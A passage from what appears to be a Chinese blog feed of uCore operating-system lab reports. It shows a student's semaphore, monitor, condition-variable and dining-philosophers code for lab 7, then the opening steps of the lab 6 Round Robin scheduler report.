class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">static</span> __noinline <span class="keyword">void</span> __up(<span class="keyword">semaphore_t</span> *sem, <span class="keyword">uint32_t</span> wait_state) &#123;</span><br><span class="line">    <span class="keyword">bool</span> intr_flag;</span><br><span class="line">    local_intr_save(intr_flag);</span><br><span class="line">    <span class="comment">//********************原子操作 start**********************************</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">wait_t</span> *wait; </span><br><span class="line">        <span class="keyword">if</span> ((wait = wait_queue_first(&amp;(sem-&gt;wait_queue))) == <span class="literal">NULL</span>) &#123;<span class="comment">//判断队列是否为空</span></span><br><span class="line">            sem-&gt;value ++;<span class="comment">//如果没有进程等待，那么信号量加一 </span></span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123;  <span class="comment">//否则唤醒队列中第一个进程 </span></span><br><span class="line">            assert(wait-&gt;proc-&gt;wait_state == wait_state);</span><br><span class="line">            wakeup_wait(&amp;(sem-&gt;wait_queue), wait, wait_state, <span class="number">1</span>); <span class="comment">//唤醒等待队列的第一个线程</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//********************原子操作end*************************************</span></span><br><span class="line">    local_intr_restore(intr_flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>整个执行过程如下</p>
<p><img src="/images/loading.gif" data-original="/posts/2cdd304c/image-20200530015025799.png" alt="image-20200530015025799"></p>
<blockquote>
<p>请在实验报告中给出给用户态进程/线程提供信号量机制的设计方案，并比较说明给内核级提供信号量机制的异同。</p>
</blockquote>
<p>由于是用户态进程，不可以直接使用内核态的信号量，因此应该将内核级的信号量操作封装成系统调用供用户态调用。</p>
<p>异同点：</p>
<ul>
<li>相同点：<ul>
<li>提供信号量机制的代码实现逻辑是相同的；</li>
</ul>
</li>
<li>不同点：<ul>
<li>由于实现原子操作的中断禁用、Test and Set指令等均需要在内核态下运行，因此提供给用户态进程的信号量机制是通过系统调用来实现的，而内核级线程只需要直接调用相应的函数就可以了</li>
</ul>
</li>
</ul>
<h2 id="练习2-完成内核级条件变量和基于内核级条件变量的哲学家就餐问题"><a href="#练习2-完成内核级条件变量和基于内核级条件变量的哲学家就餐问题" class="headerlink" title="练习2: 完成内核级条件变量和基于内核级条件变量的哲学家就餐问题"></a>练习2: 完成内核级条件变量和基于内核级条件变量的哲学家就餐问题</h2><p>首先掌握管程机制，然后基于信号量实现完成条件变量实现，然后用管程机制实现哲学家就餐问题的解决方案（基于条件变量）。</p>
<p>执行：<code>make grade</code> 。如果所显示的应用程序检测都输出ok，则基本正确。如果只是某程序过不去，比如matrix.c，则可执行</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">make run-matrix</span><br></pre></td></tr></table></figure></div>
<p>命令来单独调试它。大致执行结果可看附录。</p>
<p>请在实验报告中给出内核级条件变量的设计描述，并说明其大致执行流程。</p>
<p>请在实验报告中给出给用户态进程/线程提供条件变量机制的设计方案，并比较说明给内核级提供条件变量机制的异同。</p>
<p>请在实验报告中回答：能否不用基于信号量机制来完成条件变量？如果不能，请给出理由，如果能，请给出设计说明和具体实现。</p>
<p>该练习需要编程，查看需要编程的地方</p>
<p><img src="/images/loading.gif" data-original="/posts/2cdd304c/image-20200530151305767.png" alt="image-20200530151305767"></p>
<p>这边写错了练习序号</p>
<p>管程实现机制</p>
<p><img src="/images/loading.gif" data-original="/posts/2cdd304c/image-20200530145806416.png" alt="image-20200530145806416"></p>
<p>管程机制在monitor.c实现</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 管程数据结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">monitor</span>&#123;</span></span><br><span class="line">    <span class="keyword">semaphore_t</span> mutex; <span class="comment">// 二值信号量 用来互斥访问管程</span></span><br><span class="line">    <span class="keyword">semaphore_t</span> next; <span class="comment">// 用于 条件同步 用于发出signal操作的进程等条件为真之前进入睡眠</span></span><br><span class="line">    <span class="keyword">int</span> next_count; <span class="comment">// 记录睡在 signal 操作的进程数</span></span><br><span class="line">    <span class="keyword">condvar_t</span> *cv; <span class="comment">// 条件变量</span></span><br><span class="line">&#125; <span class="keyword">monitor_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 条件变量数据结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">condvar</span>&#123;</span></span><br><span class="line">    <span class="keyword">semaphore_t</span> sem; <span class="comment">// 用于条件同步 用于发出wait操作的进程等待条件为真之前进入睡眠</span></span><br><span class="line">    <span class="keyword">int</span> count; <span class="comment">// 记录睡在 wait 操作的进程数(等待条件变量成真)</span></span><br><span class="line">    <span class="keyword">monitor_t</span> * owner; <span class="comment">// 所属管程</span></span><br><span class="line">&#125; <span class="keyword">condvar_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化管程</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">monitor_init</span> <span class="params">(<span class="keyword">monitor_t</span> * mtp, <span class="keyword">size_t</span> num_cv)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    assert(num_cv&gt;<span class="number">0</span>);</span><br><span class="line">    mtp-&gt;next_count = <span class="number">0</span>; <span class="comment">// 睡在signal进程数 初始化为0</span></span><br><span class="line">    mtp-&gt;cv = <span class="literal">NULL</span>;</span><br><span class="line">    sem_init(&amp;(mtp-&gt;mutex), <span class="number">1</span>); <span class="comment">// 二值信号量 保护管程 使进程访问管程操作为互斥的</span></span><br><span class="line">    sem_init(&amp;(mtp-&gt;next), <span class="number">0</span>); <span class="comment">// 条件同步信号量</span></span><br><span class="line">    mtp-&gt;cv =(<span class="keyword">condvar_t</span> *) kmalloc(<span class="keyword">sizeof</span>(<span class="keyword">condvar_t</span>)*num_cv); <span class="comment">// 获取一块内核空间 放置条件变量</span></span><br><span class="line">    assert(mtp-&gt;cv!=<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;num_cv; i++)&#123;</span><br><span class="line">        mtp-&gt;cv[i].count=<span class="number">0</span>;</span><br><span class="line">        sem_init(&amp;(mtp-&gt;cv[i].sem),<span class="number">0</span>);</span><br><span class="line">        mtp-&gt;cv[i].owner=mtp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Unlock one of threads waiting on the condition variable. </span></span><br><span class="line"><span class="comment">// 管程signal操作</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">分支1. 因为条件不成立而睡眠的进程计数小于等于0 时 说明 没有进程需要唤醒 则直接返回</span></span><br><span class="line"><span class="comment">分支2. 因为条件不成立而睡眠的进程计数大于0 说明有进程需要唤醒 就将其唤醒</span></span><br><span class="line"><span class="comment">同时设置 条件变量所属管程的 next_count 加1 以用来告诉 wait操作 有进程睡在了 signal操作上</span></span><br><span class="line"><span class="comment">然后自己将自己阻塞 等待条件同步 被唤醒 被唤醒后 睡在 signal 操作上的进程应该减少 故 next_count 应减 1</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">void</span> </span><br><span class="line">cond_signal (<span class="keyword">condvar_t</span> *cvp) &#123;</span><br><span class="line">   <span class="comment">//LAB7 EXERCISE1: YOUR CODE</span></span><br><span class="line">   cprintf(<span class="string">"cond_signal begin: cvp %x, cvp-&gt;count %d, cvp-&gt;owner-&gt;next_count %d\n"</span>, cvp, cvp-&gt;count, cvp-&gt;owner-&gt;next_count);  </span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   *      cond_signal(cv) &#123;</span></span><br><span class="line"><span class="comment">   *          if(cv.count&gt;0) &#123;</span></span><br><span class="line"><span class="comment">   *             mt.next_count ++;</span></span><br><span class="line"><span class="comment">   *             signal(cv.sem);</span></span><br><span class="line"><span class="comment">   *             wait(mt.next);</span></span><br><span class="line"><span class="comment">   *             mt.next_count--;</span></span><br><span class="line"><span class="comment">   *          &#125;</span></span><br><span class="line"><span class="comment">   *       &#125;</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">+   <span class="keyword">if</span> (cvp-&gt;count &gt; <span class="number">0</span>) &#123; <span class="comment">// 若存在因为当前条件变量而等待的进程的话</span></span><br><span class="line">+       up(&amp;(cvp-&gt;sem));</span><br><span class="line">+       cvp-&gt;owner-&gt;next_count++; <span class="comment">// 所属管程的 next 计数 加 1 表示当前进程会被等待者堵塞</span></span><br><span class="line">+       down(&amp;(cvp-&gt;owner-&gt;next)); <span class="comment">// 阻塞自己 将在管程中的进程睡眠 等待条件同步</span></span><br><span class="line">+       cvp-&gt;owner-&gt;next_count--;</span><br><span class="line">+   &#125;</span><br><span class="line">   cprintf(<span class="string">"cond_signal end: cvp %x, cvp-&gt;count %d, cvp-&gt;owner-&gt;next_count %d\n"</span>, cvp, cvp-&gt;count, cvp-&gt;owner-&gt;next_count);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Suspend calling thread on a condition variable waiting for condition Atomically unlocks </span></span><br><span class="line"><span class="comment">// mutex and suspends calling thread on conditional variable after waking up locks mutex. Notice: mp is mutex semaphore for monitor's procedures</span></span><br><span class="line"><span class="comment">// 管程wait操作</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">先将 因为条件不成立而睡眠的进程计数加1</span></span><br><span class="line"><span class="comment">分支1. 当 管程的 next_count 大于 0 说明 有进程睡在了 signal 操作上 我们将其唤醒</span></span><br><span class="line"><span class="comment">分支2. 当 管程的 next_count 小于 0 说明 当前没有进程睡在 signal操作数 只需要释放互斥体</span></span><br><span class="line"><span class="comment">然后 再将 自身阻塞 等待 条件变量的条件为真 被唤醒后 将条件不成立而睡眠的进程计数减1 因为现在成立了</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">cond_wait (<span class="keyword">condvar_t</span> *cvp) &#123;</span><br><span class="line">    <span class="comment">//LAB7 EXERCISE1: YOUR CODE</span></span><br><span class="line">    cprintf(<span class="string">"cond_wait begin:  cvp %x, cvp-&gt;count %d, cvp-&gt;owner-&gt;next_count %d\n"</span>, cvp, cvp-&gt;count, cvp-&gt;owner-&gt;next_count);</span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">    *         cv.count ++;</span></span><br><span class="line"><span class="comment">    *         if(mt.next_count&gt;0)</span></span><br><span class="line"><span class="comment">    *            signal(mt.next)</span></span><br><span class="line"><span class="comment">    *         else</span></span><br><span class="line"><span class="comment">    *            signal(mt.mutex);</span></span><br><span class="line"><span class="comment">    *         wait(cv.sem);</span></span><br><span class="line"><span class="comment">    *         cv.count --;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">+   cvp-&gt;count++;<span class="comment">//条件变量中睡眠的进程数量加加  </span></span><br><span class="line">+   <span class="keyword">if</span> (cvp-&gt;owner-&gt;next_count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">+       up(&amp;(cvp-&gt;owner-&gt;next));<span class="comment">//如果当前有进程正在等待，且睡在宿主管程的信号量上，此时需要唤醒，让该调用了wait的睡，此时就唤醒了，这是一个同步问题。 </span></span><br><span class="line">+   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">+       up(&amp;(cvp-&gt;owner-&gt;mutex));<span class="comment">//如果没有进程睡眠，那么当前进程无法进入管程的原因就是互斥条件的限制。因此唤醒mutex互斥锁，代表现在互斥锁被占用，此时，再让进程睡在宿主管程的信号量上，如果睡醒了，count--</span></span><br><span class="line">+   &#125;</span><br><span class="line"></span><br><span class="line">+   down(&amp;(cvp-&gt;sem)); <span class="comment">//因为条件不满足，所以主动调用wait的进程，会睡在条件变量cvp的信号量上，是条件不满足的问题；而因为调用signal唤醒其他进程而导致自身互斥睡眠，会睡在宿主管程cvp-&gt;owner的信号量上，是同步的问题 </span></span><br><span class="line">+   cvp-&gt;count--;</span><br><span class="line">    cprintf(<span class="string">"cond_wait end:  cvp %x, cvp-&gt;count %d, cvp-&gt;owner-&gt;next_count %d\n"</span>, cvp, cvp-&gt;count, cvp-&gt;owner-&gt;next_count);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>补充check_sync.c的代码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line">check_sync.c:</span><br><span class="line"><span class="comment">//-----------------philosopher problem using monitor ------------</span></span><br><span class="line"><span class="comment">/*PSEUDO CODE :philosopher problem using monitor</span></span><br><span class="line"><span class="comment"> * monitor dp</span></span><br><span class="line"><span class="comment"> * &#123;</span></span><br><span class="line"><span class="comment"> *  enum &#123;thinking, hungry, eating&#125; state[5];</span></span><br><span class="line"><span class="comment"> *  condition self[5];</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  void pickup(int i) &#123;</span></span><br><span class="line"><span class="comment"> *      state[i] = hungry;</span></span><br><span class="line"><span class="comment"> *      if ((state[(i+4)%5] != eating) &amp;&amp; (state[(i+1)%5] != eating)) &#123;</span></span><br><span class="line"><span class="comment"> *        state[i] = eating;</span></span><br><span class="line"><span class="comment"> *      else</span></span><br><span class="line"><span class="comment"> *         self[i].wait();</span></span><br><span class="line"><span class="comment"> *   &#125;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   void putdown(int i) &#123;</span></span><br><span class="line"><span class="comment"> *      state[i] = thinking;</span></span><br><span class="line"><span class="comment"> *      if ((state[(i+4)%5] == hungry) &amp;&amp; (state[(i+3)%5] != eating)) &#123;</span></span><br><span class="line"><span class="comment"> *          state[(i+4)%5] = eating;</span></span><br><span class="line"><span class="comment"> *          self[(i+4)%5].signal();</span></span><br><span class="line"><span class="comment"> *      &#125;</span></span><br><span class="line"><span class="comment"> *      if ((state[(i+1)%5] == hungry) &amp;&amp; (state[(i+2)%5] != eating)) &#123;</span></span><br><span class="line"><span class="comment"> *          state[(i+1)%5] = eating;</span></span><br><span class="line"><span class="comment"> *          self[(i+1)%5].signal();</span></span><br><span class="line"><span class="comment"> *      &#125;</span></span><br><span class="line"><span class="comment"> *   &#125;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   void init() &#123;</span></span><br><span class="line"><span class="comment"> *      for (int i = 0; i &lt; 5; i++)</span></span><br><span class="line"><span class="comment"> *         state[i] = thinking;</span></span><br><span class="line"><span class="comment"> *   &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">philosopher_proc_condvar</span>[<span class="title">N</span>];</span> <span class="comment">// N philosopher</span></span><br><span class="line"><span class="keyword">int</span> state_condvar[N];                            <span class="comment">// the philosopher's state: EATING, HUNGARY, THINKING  </span></span><br><span class="line"><span class="keyword">monitor_t</span> mt, *mtp=&amp;mt;                          <span class="comment">// monitor</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">phi_test_condvar</span> <span class="params">(i)</span> </span>&#123; </span><br><span class="line">    <span class="keyword">if</span>(state_condvar[i]==HUNGRY&amp;&amp;state_condvar[LEFT]!=EATING</span><br><span class="line">            &amp;&amp;state_condvar[RIGHT]!=EATING) &#123;</span><br><span class="line">        cprintf(<span class="string">"phi_test_condvar: state_condvar[%d] will eating\n"</span>,i);</span><br><span class="line">        state_condvar[i] = EATING ;</span><br><span class="line">        cprintf(<span class="string">"phi_test_condvar: signal self_cv[%d] \n"</span>,i);</span><br><span class="line">        cond_signal(&amp;mtp-&gt;cv[i]) ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">phi_take_forks_condvar</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">     down(&amp;(mtp-&gt;mutex));<span class="comment">// P操作进入临界区</span></span><br><span class="line"><span class="comment">//--------into routine in monitor--------------</span></span><br><span class="line">     <span class="comment">// LAB7 EXERCISE1: YOUR CODE</span></span><br><span class="line">     <span class="comment">// I am hungry</span></span><br><span class="line">     <span class="comment">// try to get fork</span></span><br><span class="line"><span class="comment">//--------leave routine in monitor--------------</span></span><br><span class="line">+   state_condvar[i] = HUNGRY; <span class="comment">// 饥饿状态 准备进食</span></span><br><span class="line">+   phi_test_condvar(i); <span class="comment">// 测试当前是否能获得刀叉 </span></span><br><span class="line">+   <span class="keyword">while</span> (state_condvar[i] != EATING) &#123;</span><br><span class="line">+       cond_wait(&amp;mtp-&gt;cv[i]); <span class="comment">// 若不能拿 则阻塞自己 等其它进程唤醒</span></span><br><span class="line">+   &#125;</span><br><span class="line">      <span class="keyword">if</span>(mtp-&gt;next_count&gt;<span class="number">0</span>)</span><br><span class="line">         up(&amp;(mtp-&gt;next));</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">         up(&amp;(mtp-&gt;mutex));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">phi_put_forks_condvar</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">     down(&amp;(mtp-&gt;mutex));<span class="comment">// P操作进入临界区</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//--------into routine in monitor--------------</span></span><br><span class="line">     <span class="comment">// LAB7 EXERCISE1: YOUR CODE</span></span><br><span class="line">     <span class="comment">// I ate over</span></span><br><span class="line">     <span class="comment">// test left and right neighbors</span></span><br><span class="line"><span class="comment">//--------leave routine in monitor--------------</span></span><br><span class="line">+    state_condvar[i] = THINKING; <span class="comment">// 思考状态</span></span><br><span class="line">+    phi_test_condvar(LEFT); <span class="comment">// 试试左右两边能否获得刀叉</span></span><br><span class="line">+    phi_test_condvar(RIGHT);</span><br><span class="line">     <span class="keyword">if</span>(mtp-&gt;next_count&gt;<span class="number">0</span>)<span class="comment">// 有哲学家睡在 signal操作 则将其唤醒</span></span><br><span class="line">        up(&amp;(mtp-&gt;next));</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">        up(&amp;(mtp-&gt;mutex));<span class="comment">// 离开临界区</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//---------- philosophers using monitor (condition variable) ----------------------</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">philosopher_using_condvar</span><span class="params">(<span class="keyword">void</span> * arg)</span> </span>&#123; <span class="comment">/* arg is the No. of philosopher 0~N-1*/</span></span><br><span class="line">  </span><br><span class="line">    <span class="keyword">int</span> i, iter=<span class="number">0</span>;</span><br><span class="line">    i=(<span class="keyword">int</span>)arg;</span><br><span class="line">    cprintf(<span class="string">"I am No.%d philosopher_condvar\n"</span>,i);</span><br><span class="line">    <span class="keyword">while</span>(iter++&lt;TIMES)</span><br><span class="line">    &#123; <span class="comment">/* iterate*/</span></span><br><span class="line">        cprintf(<span class="string">"Iter %d, No.%d philosopher_condvar is thinking\n"</span>,iter,i); <span class="comment">/* thinking*/</span></span><br><span class="line">        do_sleep(SLEEP_TIME);</span><br><span class="line">        phi_take_forks_condvar(i); </span><br><span class="line">        <span class="comment">/* need two forks, maybe blocked */</span></span><br><span class="line">        cprintf(<span class="string">"Iter %d, No.%d philosopher_condvar is eating\n"</span>,iter,i); <span class="comment">/* eating*/</span></span><br><span class="line">        do_sleep(SLEEP_TIME);</span><br><span class="line">        phi_put_forks_condvar(i); </span><br><span class="line">        <span class="comment">/* return two forks back*/</span></span><br><span class="line">    &#125;</span><br><span class="line">    cprintf(<span class="string">"No.%d philosopher_condvar quit\n"</span>,i);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试编号为i的哲学家是否能获得刀叉 如果能获得 则将状态改为正在吃 并且 尝试唤醒 因为wait操作睡眠的进程</span></span><br><span class="line"><span class="comment">// cond_signal 还会阻塞自己 等被唤醒的进程唤醒自己</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">phi_test_condvar</span> <span class="params">(i)</span> </span>&#123; </span><br><span class="line">    <span class="keyword">if</span>(state_condvar[i]==HUNGRY&amp;&amp;state_condvar[LEFT]!=EATING</span><br><span class="line">            &amp;&amp;state_condvar[RIGHT]!=EATING) &#123;</span><br><span class="line">        cprintf(<span class="string">"phi_test_condvar: state_condvar[%d] will eating\n"</span>,i);</span><br><span class="line">        state_condvar[i] = EATING ;</span><br><span class="line">        cprintf(<span class="string">"phi_test_condvar: signal self_cv[%d] \n"</span>,i);</span><br><span class="line">        cond_signal(&amp;mtp-&gt;cv[i]) ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>具体原理如下</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">哲学家-&gt;试试拿刀叉-&gt;能拿-&gt;signal 唤醒被wait阻塞的进程-&gt;阻塞本身</span><br><span class="line">                  |             |                  A</span><br><span class="line">                  |             V                  |</span><br><span class="line">                  -&gt;不能拿-&gt;wait阻塞本身             |</span><br><span class="line">                                                   |</span><br><span class="line">哲学家-&gt;放刀叉-&gt;让左右两边试试拿刀叉-&gt;有哲学家睡在signal 唤醒他</span><br></pre></td></tr></table></figure></div>
<p>make grade</p>
<p><img src="/images/loading.gif" data-original="/posts/2cdd304c/image-20200503010426035.png" alt="image-20200503010426035"></p>
<p>通过</p>
<p>make run-matrix</p>
<p><img src="/images/loading.gif" data-original="/posts/2cdd304c/image-20200530155051610.png" alt="image-20200530155051610"></p>
<p>有关输出显示</p>
<blockquote>
<p>请在实验报告中给出给用户态进程/线程提供条件变量机制的设计方案，并比较说明给内核级提供条件变量机制的异同。</p>
</blockquote>
<p>同练习1，通过系统调用实现</p>
<p>异同点类似</p>
<ul>
<li>相同点：基本的实现逻辑相同；</li>
<li>不一样点：最终在用户态下实现管程和条件变量机制，须要使用到操做系统使用系统调用提供必定的支持; 而在内核态下实现条件变量是不需要的；</li>
</ul>
<h1 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h1><p>本次实验是基于哲学家就餐问题所展开的，并分别用信号量机制和管程机制实现同步和互斥，本次实验代码较为复杂，但是所要编码的部分较为简单，其中管程部分较难理解，还是要多加学习。</p>
]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title>uCoreOS lab6 实验报告</title>
    <url>/posts/48714bfd/</url>
    <content><![CDATA[<h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><ul>
<li>理解操作系统的调度管理机制</li>
<li>熟悉 ucore 的系统调度器框架，以及缺省的Round-Robin 调度算法</li>
<li>基于调度器框架实现一个(Stride Scheduling)调度算法来替换缺省的调度算法<a id="more"></a></li>
</ul>
<h1 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h1><p>查看lab6相关的代码</p>
<p><img src="/images/loading.gif" data-original="/posts/48714bfd/image-20200501153209081.png" alt="image-20200501153209081"></p>
<h2 id="练习0：填写已有实验"><a href="#练习0：填写已有实验" class="headerlink" title="练习0：填写已有实验"></a>练习0：填写已有实验</h2><p>本实验依赖实验1/2/3/4/5。请把你做的实验2/3/4/5的代码填入本实验中代码中有“LAB1”/“LAB2”/“LAB3”/“LAB4”“LAB5”的注释相应部分。并确保编译通过。注意：为了能够正确执行lab6的测试应用程序，可能需对已完成的实验1/2/3/4/5的代码进行进一步改进。</p>
<p>要修改的文件有<code>proc.c default_pmm.c pmm.c swap_fifo.c vmm.c trap.c kdebug.c</code></p>
<p>另外，有部分需要在原代码基础上修改</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line">proc.c</span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *</span></span><br><span class="line"><span class="class"><span class="title">alloc_proc</span>(<span class="title">void</span>) &#123;</span></span><br><span class="line">    ...</span><br><span class="line">     <span class="comment">//LAB6 YOUR CODE : (update LAB5 steps)</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * below fields(add in LAB6) in proc_struct need to be initialized</span></span><br><span class="line"><span class="comment">     *     struct run_queue *rq;                       // running queue contains Process</span></span><br><span class="line"><span class="comment">     *     list_entry_t run_link;                      // the entry linked in run queue</span></span><br><span class="line"><span class="comment">     *     int time_slice;                             // time slice for occupying the CPU</span></span><br><span class="line"><span class="comment">     *     skew_heap_entry_t lab6_run_pool;            // FOR LAB6 ONLY: the entry in the run pool</span></span><br><span class="line"><span class="comment">     *     uint32_t lab6_stride;                       // FOR LAB6 ONLY: the current stride of the process</span></span><br><span class="line"><span class="comment">     *     uint32_t lab6_priority;                     // FOR LAB6 ONLY: the priority of process, set by lab6_set_priority(uint32_t)</span></span><br><span class="line"><span class="comment">     */</span>        </span><br><span class="line">    proc-&gt;rq = <span class="literal">NULL</span>;<span class="comment">//置运行队列为空</span></span><br><span class="line">    <span class="comment">//该进程的调度链表结构，该结构内部的链接组成了运行队列列表</span></span><br><span class="line">    list_init(&amp;(proc-&gt;run_link));<span class="comment">//初始化运行队列的指针</span></span><br><span class="line">    <span class="comment">//该进程剩余的时间片，只对当前进程有效</span></span><br><span class="line">    proc-&gt;time_slice = <span class="number">0</span>;<span class="comment">//初始化时间片</span></span><br><span class="line">    <span class="comment">//该进程在优先队列中的节点，仅在lab6中使用</span></span><br><span class="line">    proc-&gt;lab6_run_pool.left = proc-&gt;lab6_run_pool.right = proc-&gt;lab6_run_pool.parent = <span class="literal">NULL</span>; <span class="comment">//初始化各类指针为空</span></span><br><span class="line">    <span class="comment">//该进程的调度步进值，仅在lab6中使用</span></span><br><span class="line">    proc-&gt;lab6_stride = <span class="number">0</span>;<span class="comment">//初始化当前运行步数</span></span><br><span class="line">    <span class="comment">//该进程的调度优先级，仅在lab6中使用</span></span><br><span class="line">    proc-&gt;lab6_priority = <span class="number">0</span>;<span class="comment">//初始化优先级</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">trap.c</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">trap_dispatch(struct trapframe *tf) &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">case</span> IRQ_OFFSET + IRQ_TIMER:    </span><br><span class="line">         ...</span><br><span class="line">		ticks++;</span><br><span class="line">-		<span class="comment">//if(ticks%TICK_NUM == 0)&#123;//每次时钟中断之后ticks就会加一 当加到TICK_NUM次数时 打印并重新开始</span></span><br><span class="line">-		<span class="comment">//	//print_ticks();//前面有定义 打印字符串</span></span><br><span class="line">-		<span class="comment">//	assert(current != NULL);</span></span><br><span class="line">-		<span class="comment">//	current-&gt;need_resched = 1;</span></span><br><span class="line">-		<span class="comment">//&#125;</span></span><br><span class="line">        <span class="comment">/* LAB6 YOUR CODE */</span></span><br><span class="line">        <span class="comment">/* IMPORTANT FUNCTIONS:</span></span><br><span class="line"><span class="comment">	     * run_timer_list</span></span><br><span class="line"><span class="comment">	     *----------------------</span></span><br><span class="line"><span class="comment">	     * you should update your lab5 code (just add ONE or TWO lines of code):</span></span><br><span class="line"><span class="comment">         *    Every tick, you should update the system time, iterate the timers, and trigger the timers which are end to call scheduler.</span></span><br><span class="line"><span class="comment">         *    You can use one funcitons to finish all these things.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">		<span class="comment">// 在时钟中断下 添加以下几行 并去掉之前设置 进程需要调度标记</span></span><br><span class="line">    	<span class="comment">// 这个标记现在已经被 调度程序所使用了 不再需要自己控制</span></span><br><span class="line">+        assert(current != <span class="literal">NULL</span>);</span><br><span class="line">+        run_timer_list(); <span class="comment">//更新定时器 并根据参数调用调度算法</span></span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="练习1-使用-Round-Robin-调度算法"><a href="#练习1-使用-Round-Robin-调度算法" class="headerlink" title="练习1: 使用 Round Robin 调度算法"></a>练习1: 使用 Round Robin 调度算法</h2><p>完成练习0后，建议大家比较一下（可用kdiff3等文件比较软件）个人完成的lab5和练习0完成后的刚修改的lab6之间的区别，分析了解lab6采用RR调度算法后的执行过程。执行make grade，大部分测试用例应该通过。但执行priority.c应该过不去。</p>
<p>请在实验报告中完成：</p>
<ul>
<li>请理解并分析sched_class中各个函数指针的用法，并结合Round Robin 调度算法描ucore的调度执行过程</li>
<li>请在实验报告中简要说明如何设计实现“多级反馈队列调度算法”，给出概要设计，鼓励给出详细设计</li>
</ul>
<h3 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h3><p>执行<code>make grade</code></p>
